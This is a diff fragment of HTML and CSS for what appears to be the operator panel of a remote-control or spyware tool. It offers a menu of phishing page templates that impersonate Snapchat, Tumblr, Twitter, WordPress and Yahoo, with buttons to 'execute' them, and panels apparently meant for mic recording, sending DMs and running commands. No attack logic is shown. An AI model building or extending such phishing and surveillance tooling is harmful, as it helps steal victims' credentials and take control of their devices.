+<option value="snapchat.html">
+
+
+snapchat.html
+</option>
+<option value="tumblr.html">
+
+tumblr.html
+</option>
+<option value="twitter_desktop.html">
+
+twitter_desktop.html
+</option>
+<option value="twitter_mobile.html">
+
+twitter_mobile.html
+</option>
+<option value="wordpress.html">
+
+wordpress.html
+</option>
+<option value="yahoo.html">
+
+yahoo.html
+</option>
+</select>
+<button onclick="execphish()"> Execute</button>
+</center>
+<br>
+<hr>
+<br>
+<input type="text" id="shpih"  placeholder="Enter Your Link"  />
+<br><button class="btn"  onclick="execphish2()">Execute</button>
+</div>
+
+<style type="text/css">
+#showphishj select{
+height:40px;
+margin:auto;
+margin-top:20px;
+color:#fff;
+background:#001;
+border-radius:5px;
+}
+#showphishj button{
+height:30px;
+width:150px;
+background:#000;
+color:#0dd;
+border-radius:5px;
+margin-top:20px;
+border:1px solid #f00;
+}
+audio{
+display:none;
+}
+#showrecs{
+overflow:auto;
+color:#0fa;
+}
+::-webkit-scrollbar {
+width: 0px;
+}
+.downlii,.plrec{
+height:100%;
+width:40px;
+float:right;
+margin-left:10px;
+margin-right:0px;
+margin-top:5px;
+}
+.downlii{
+margin-right:20px;
+}
+
+.downlii svg,.plrec svg{
+height:90%;
+width:90%;
+}
+.downlii svg{
+height:65%;
+width:65%;
+margin-top:8px;
+}
+.recswarp{
+margin:auto;
+margin-top:5px;
+background:#001;
+width:90%;
+display:flex;
+align-items:center;
+border-radius:10px;
+height:50px;
+border: solid 1px #0dd;
+}
+#selectedimg{
+border:2px solid red;
+}
+.wallimg{
+display:flex;
+height:200px;
+margin:auto;
+width:100%;
+}
+.wallimg img{
+height:100%;
+border-radius:7px;
+margin-left:10px;
+width:30%;
+}
+#pvtt h4{
+color:#0dd;
+}
+#pvtt input,#showphishj input,#senddm input,#micrec input[type="text"]{
+height:30px;
+padding:5px;
+width:80%;
+line-height:40px;
+border:0.5px solid #0dd;
+background:#001;
+color:#fff;
+border-radius:5px;
+}
+#senddm{color:#fff}
+#senddm input{
+height:20px;
+margin-left:10px;
+}
+#toastdiv,#pvtt,#showphishj,#micrec,#senddm,#wallpaperdiv{
+height:100%;
+width:100%;
+background:#000;
+position:absolute;
+top:0;
+left:0;
+display:none;
+z-index:99;
+}
+
+#pvtt button,#micrec .btn,#senddm button,#wallpaperdiv button{
+margin-top:10px;
+height:30px;
+width:110px;
+color:#fff;
+background:black;
+border:1px solid red;
+border-radius:5px;
+}
+/* use for test*/
+#showphisj{
+z-index:9999999999999;
+display:block;
+}
+#pvtt{
+width:calc(100% - 40px);
+padding:20px;
+}
+.diachild p{
+height:50px;
+overflow:auto;
+}
+.diachild button{
+height:30px;
+width:110px;
+color:#fff;
+background:black;
+float:right;
+border:1px solid red;
+border-radius:5px;
+}
+.diachild{
+height:150px;
+background:#001;
+border-radius:10px;
+color:white;
+padding:10px;
+border:1px solid green;
+width:calc(100% - 50px);
+}
+#diamain{
+height:100%;
+width:100%;
+background:rgba(0,0,0,.9);
+position:absolute;
+top:0;
+display:none;
+align-items:center;
+justify-content:center;
+left:0;
+z-index:99999999999999999;
+}
+#toastdiv h3,#micrec h3,#showphishj h3{
+color:#0dd;
+margin-left:30px;
+}
+
+#toastcmd,#senddm textarea{
+margin-left:30px;
+height:40%;
+padding-top:10px;
+padding-left:10px;
+width:80%;
+border:0.5px solid #0dd;
+background:#001;
+color:#fff;
+border-radius:5px;
+}
+#toastdiv button{
+margin-left:30px;
+height:30px;
+width:110px;
+color:#fff;
+background:black;
+border:1px solid red;
+border-radius:5px;
+}
+#cmdcernter {
+display:none;
+}
+</style>
+</div>
+<script type="text/javascript" src="./script.js"></script>
+<style>
+img[alt*="www.000webhost.com"], .disclaimer {
+display: none
+}  
+</style>
 </body>
 </html>
